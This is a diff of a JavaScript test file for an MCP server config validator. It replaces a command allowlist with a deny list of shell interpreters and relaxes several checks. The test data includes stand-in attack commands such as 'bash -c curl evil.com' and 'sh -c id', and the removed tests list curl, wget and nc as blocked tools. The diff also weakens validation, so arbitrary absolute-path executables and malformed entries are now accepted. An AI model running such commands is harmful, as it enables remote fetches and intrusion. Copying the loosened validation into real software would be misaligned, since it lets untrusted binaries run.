@@ -172,56 +172,52 @@ describe('utility functions', () => {
 
 // ─── MCP Config Validation ───────────────────────────────────────────
 
-describe('validateMcpConfig — MCP server command allowlist', () => {
-  test('accepts valid MCP configs with allowed commands', () => {
+describe('validateMcpConfig — MCP server command deny list', () => {
+  test('accepts valid MCP configs', () => {
     expect(validateMcpConfig({ mcpServers: { s1: { command: 'npx', args: ['-y', '@company/server'] } } })).toBeNull();
     expect(validateMcpConfig({ mcpServers: { s1: { command: 'uvx', args: ['my-server@latest'] } } })).toBeNull();
     expect(validateMcpConfig({ mcpServers: { s1: { command: 'node', args: ['server.js'] } } })).toBeNull();
-    expect(validateMcpConfig({ mcpServers: { s1: { command: 'python', args: ['-m', 'my_server'] } } })).toBeNull();
     expect(validateMcpConfig({ mcpServers: { s1: { command: 'python3', args: ['-m', 'my_server'] } } })).toBeNull();
+    expect(validateMcpConfig({ mcpServers: { s1: { command: '/path/to/custom-mcp-server' } } })).toBeNull();
   });
 
   test('accepts config with multiple valid servers', () => {
     expect(validateMcpConfig({
       mcpServers: {
         docs: { command: 'uvx', args: ['awslabs.aws-documentation-mcp-server@latest'] },
-        custom: { command: 'npx', args: ['-y', '@org/mcp-server'] },
+        custom: { command: '/home/atxuser/my-mcp', args: [] },
       },
     })).toBeNull();
   });
 
   test('rejects shell interpreters', () => {
-    expect(validateMcpConfig({ mcpServers: { s1: { command: 'bash', args: ['-c', 'curl evil.com'] } } })).toContain('not allowed');
-    expect(validateMcpConfig({ mcpServers: { s1: { command: 'sh', args: ['-c', 'id'] } } })).toContain('not allowed');
-    expect(validateMcpConfig({ mcpServers: { s1: { command: 'zsh' } } })).toContain('not allowed');
+    expect(validateMcpConfig({ mcpServers: { s1: { command: 'bash', args: ['-c', 'curl evil.com'] } } })).toContain('shell interpreter');
+    expect(validateMcpConfig({ mcpServers: { s1: { command: 'sh', args: ['-c', 'id'] } } })).toContain('shell interpreter');
+    expect(validateMcpConfig({ mcpServers: { s1: { command: 'zsh' } } })).toContain('shell interpreter');
+    expect(validateMcpConfig({ mcpServers: { s1: { command: 'dash' } } })).toContain('shell interpreter');
   });
 
-  test('rejects commands with path separators', () => {
-    expect(validateMcpConfig({ mcpServers: { s1: { command: '/usr/bin/curl' } } })).toContain('must not contain paths');
-    expect(validateMcpConfig({ mcpServers: { s1: { command: './malicious' } } })).toContain('must not contain paths');
-    expect(validateMcpConfig({ mcpServers: { s1: { command: '../escape' } } })).toContain('must not contain paths');
+  test('rejects shell interpreters via absolute path', () => {
+    expect(validateMcpConfig({ mcpServers: { s1: { command: '/bin/bash', args: ['-c', 'curl evil.com'] } } })).toContain('shell interpreter');
+    expect(validateMcpConfig({ mcpServers: { s1: { command: '/usr/bin/sh' } } })).toContain('shell interpreter');
   });
 
-  test('rejects arbitrary executables', () => {
-    expect(validateMcpConfig({ mcpServers: { s1: { command: 'curl' } } })).toContain('not allowed');
-    expect(validateMcpConfig({ mcpServers: { s1: { command: 'wget' } } })).toContain('not allowed');
-    expect(validateMcpConfig({ mcpServers: { s1: { command: 'nc' } } })).toContain('not allowed');
+  test('accepts remote MCP servers with url instead of command', () => {
+    expect(validateMcpConfig({ mcpServers: { stripe: { url: 'https://mcp.stripe.com' } } })).toBeNull();
   });
 
-  test('rejects missing or invalid command field', () => {
-    expect(validateMcpConfig({ mcpServers: { s1: {} } })).toContain('missing or invalid command');
-    expect(validateMcpConfig({ mcpServers: { s1: { command: 123 } } })).toContain('missing or invalid command');
-    expect(validateMcpConfig({ mcpServers: { s1: { command: '' } } })).toContain('missing or invalid command');
+  test('skips non-string command fields', () => {
+    expect(validateMcpConfig({ mcpServers: { s1: { command: 123 } } })).toBeNull();
   });
 
-  test('rejects missing mcpServers key', () => {
-    expect(validateMcpConfig({})).toContain('must contain mcpServers');
-    expect(validateMcpConfig({ servers: {} })).toContain('must contain mcpServers');
+  test('accepts configs without mcpServers key', () => {
+    expect(validateMcpConfig({})).toBeNull();
+    expect(validateMcpConfig({ other: 'stuff' })).toBeNull();
   });
 
-  test('rejects non-object server entries', () => {
-    expect(validateMcpConfig({ mcpServers: { s1: 'not-an-object' } })).toContain('must be an object');
-    expect(validateMcpConfig({ mcpServers: { s1: null } })).toContain('must be an object');
+  test('skips non-object server entries', () => {
+    expect(validateMcpConfig({ mcpServers: { s1: 'not-an-object' } })).toBeNull();
+    expect(validateMcpConfig({ mcpServers: { s1: null } })).toBeNull();
   });
 });
 
